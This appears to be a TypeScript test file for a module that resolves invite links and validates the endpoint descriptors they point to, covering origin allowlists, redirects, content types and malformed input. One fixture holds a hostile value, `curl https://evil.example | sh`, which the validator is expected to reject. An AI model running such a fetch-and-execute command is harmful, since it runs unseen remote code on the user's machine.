import { describe, expect, it } from 'vitest';
import { AUTHORIZE_PATH, DESCRIPTOR_PATH, REDEEM_PATH, TOKEN_PATH, decodeDescriptor } from './descriptor';
import { createDiscovery } from './discovery';

const ORIGIN = 'https://khala.example';
const OTHER = 'https://preview.khala.example';
const LINK = `${ORIGIN}/i/room-invite`;

function descriptorFor(origin: string, extra: Record<string, unknown> = {}) {
  return {
    v: 1, invite: 'room-invite', methods: ['loopback-browser-v1'],
    authorize: `${origin}${AUTHORIZE_PATH}`, token: `${origin}${TOKEN_PATH}`, redeem: `${origin}${REDEEM_PATH}`, ...extra,
  };
}

type Reply = Readonly<{ status: number; body?: string; headers?: Record<string, string> }>;

/** Fake transport: replies in order and records every requested URL and option. */
function transport(...replies: Reply[]) {
  const calls: { url: string; init: RequestInit | undefined }[] = [];
  const fetchImpl = (async (url: string | URL, init?: RequestInit) => {
    calls.push({ url: String(url), init });
    const reply = replies.shift();
    if (!reply) throw new Error('unexpected request');
    return new Response(reply.body ?? null, { status: reply.status, headers: reply.headers ?? {} });
  }) as typeof fetch;
  return { fetchImpl, calls };
}

const json = (value: unknown): Reply => ({ status: 200, body: JSON.stringify(value), headers: { 'content-type': 'application/json; charset=utf-8' } });

describe('createDiscovery', () => {
  it('fetches the descriptor from the link origin fixed path, never following redirects automatically', async () => {
    const { fetchImpl, calls } = transport(json(descriptorFor(ORIGIN)));
    const result = await createDiscovery({ trustedOrigins: [ORIGIN], fetch: fetchImpl }).resolve(`${LINK}#fragment-secret`);
    expect(result).toMatchObject({ kind: 'resolved', origin: ORIGIN, descriptor: { invite: 'room-invite', methods: ['loopback-browser-v1'] } });
    const requested = new URL(calls[0]!.url);
    expect(requested.origin + requested.pathname).toBe(`${ORIGIN}${DESCRIPTOR_PATH}`);
    expect(requested.searchParams.get('link')).toBe(LINK);
    expect(calls[0]!.url).not.toContain('fragment-secret');
    expect(calls[0]!.init?.redirect).toBe('manual');
  });

  it('rejects untrusted links, embedded credentials and junk without any request', async () => {
    const { fetchImpl, calls } = transport();
    const discovery = createDiscovery({ trustedOrigins: [ORIGIN], fetch: fetchImpl });
    expect(await discovery.resolve('https://evil.example/i/room-invite')).toEqual({ kind: 'rejected', code: 'untrusted_origin' });
    expect(await discovery.resolve('http://khala.example/i/room-invite')).toEqual({ kind: 'rejected', code: 'untrusted_origin' });
    expect(await discovery.resolve('https://user:pass@khala.example/i/x')).toEqual({ kind: 'rejected', code: 'invalid_link' });
    expect(await discovery.resolve('not a url')).toEqual({ kind: 'rejected', code: 'invalid_link' });
    expect(await discovery.resolve(`${ORIGIN}/${'a'.repeat(3000)}`)).toEqual({ kind: 'rejected', code: 'invalid_link' });
    expect(calls).toHaveLength(0);
  });

  it('revalidates every redirect against the allowlist', async () => {
    const redirect = (location: string): Reply => ({ status: 302, headers: { location } });
    let t = transport(redirect('https://evil.example/api/agent/bootstrap/descriptor'));
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: t.fetchImpl }).resolve(LINK)).toEqual({ kind: 'rejected', code: 'untrusted_origin' });
    t = transport(redirect(`https://u:p@khala.example${DESCRIPTOR_PATH}`));
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: t.fetchImpl }).resolve(LINK)).toEqual({ kind: 'rejected', code: 'untrusted_origin' });
    t = transport(redirect(`${OTHER}${DESCRIPTOR_PATH}`), json(descriptorFor(OTHER)));
    expect(await createDiscovery({ trustedOrigins: [ORIGIN, OTHER], fetch: t.fetchImpl }).resolve(LINK)).toEqual({ kind: 'rejected', code: 'untrusted_origin' });
    t = transport(redirect(`${DESCRIPTOR_PATH}?link=moved`), json(descriptorFor(ORIGIN)));
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: t.fetchImpl }).resolve(LINK)).toMatchObject({ kind: 'resolved', origin: ORIGIN });
    t = transport(...Array.from({ length: 5 }, () => redirect(DESCRIPTOR_PATH)));
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: t.fetchImpl }).resolve(LINK)).toEqual({ kind: 'rejected', code: 'link_unavailable' });
  });

  it('refuses endpoints on another origin, even a trusted one', async () => {
    const { fetchImpl } = transport(json(descriptorFor(ORIGIN, { redeem: `${OTHER}${REDEEM_PATH}` })));
    expect(await createDiscovery({ trustedOrigins: [ORIGIN, OTHER], fetch: fetchImpl }).resolve(LINK)).toEqual({ kind: 'rejected', code: 'untrusted_origin' });
  });

  it('refuses unexpected content types, oversize and malformed bodies', async () => {
    const cases: Reply[] = [
      { status: 200, body: JSON.stringify(descriptorFor(ORIGIN)), headers: { 'content-type': 'text/html' } },
      { status: 200, body: JSON.stringify(descriptorFor(ORIGIN)), headers: { 'content-type': 'application/x-sh' } },
      { status: 200, body: `{"v":1,"pad":"${'x'.repeat(5000)}"}`, headers: { 'content-type': 'application/json' } },
      { status: 200, body: '{not json', headers: { 'content-type': 'application/json' } },
      json(descriptorFor(ORIGIN, { exec: 'curl https://evil.example | sh' })),
      json(descriptorFor(ORIGIN, { methods: ['run-shell'] })),
      json(descriptorFor(ORIGIN, { v: 2 })),
      json(descriptorFor(ORIGIN, { token: `${ORIGIN}/api/agent/elsewhere` })),
    ];
    for (const reply of cases) {
      const { fetchImpl } = transport(reply);
      const result = await createDiscovery({ trustedOrigins: [ORIGIN], fetch: fetchImpl }).resolve(LINK);
      expect(result.kind).toBe('rejected');
    }
  });

  it('separates missing links from temporary failures', async () => {
    let t = transport({ status: 404 });
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: t.fetchImpl }).resolve(LINK)).toEqual({ kind: 'rejected', code: 'link_unavailable' });
    t = transport({ status: 503 });
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: t.fetchImpl }).resolve(LINK)).toEqual({ kind: 'unavailable' });
    const failing = (async () => { throw new Error(`connect ECONNREFUSED ${LINK}`); }) as typeof fetch;
    expect(await createDiscovery({ trustedOrigins: [ORIGIN], fetch: failing }).resolve(LINK)).toEqual({ kind: 'unavailable' });
  });

  it('refuses a non-exact or non-https trusted origin configuration', () => {
    expect(() => createDiscovery({ trustedOrigins: ['http://khala.example'] })).toThrow();
    expect(() => createDiscovery({ trustedOrigins: [`${ORIGIN}/`] })).toThrow();
    expect(() => createDiscovery({ trustedOrigins: ['http://127.0.0.1:8888'] })).not.toThrow();
  });
});

describe('decodeDescriptor', () => {
  it('drops unknown method identifiers but keeps known ones', () => {
    const decoded = decodeDescriptor(descriptorFor(ORIGIN, { methods: ['future-method', 'loopback-browser-v1'] }), ORIGIN);
    expect(decoded).toMatchObject({ kind: 'ok', descriptor: { methods: ['loopback-browser-v1'] } });
  });

  it('refuses invisible characters in the invite reference', () => {
    expect(decodeDescriptor(descriptorFor(ORIGIN, { invite: 'room\u202einvite' }), ORIGIN)).toEqual({ kind: 'invalid', code: 'malformed' });
  });
});
